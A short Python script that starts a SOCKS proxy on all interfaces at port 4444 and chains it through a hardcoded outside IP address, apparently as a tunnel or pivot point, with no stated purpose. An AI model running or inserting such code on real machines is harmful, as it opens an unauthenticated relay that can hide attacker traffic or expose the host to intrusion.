import subprocess
import threading

def execute_command(ip):
    process = subprocess.Popen(["proxy", "socks", "-t", "tcp", "-p", "0.0.0.0:4444", "-P", ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    while True:
        output = process.stdout.readline()
        if output == '' and process.poll() is not None:
            break
        if output:
            print(output.strip())

def read_output():
    thread = threading.Thread(target=execute_command, args=("171.232.94.200:32883",))
    thread.start()

read_output()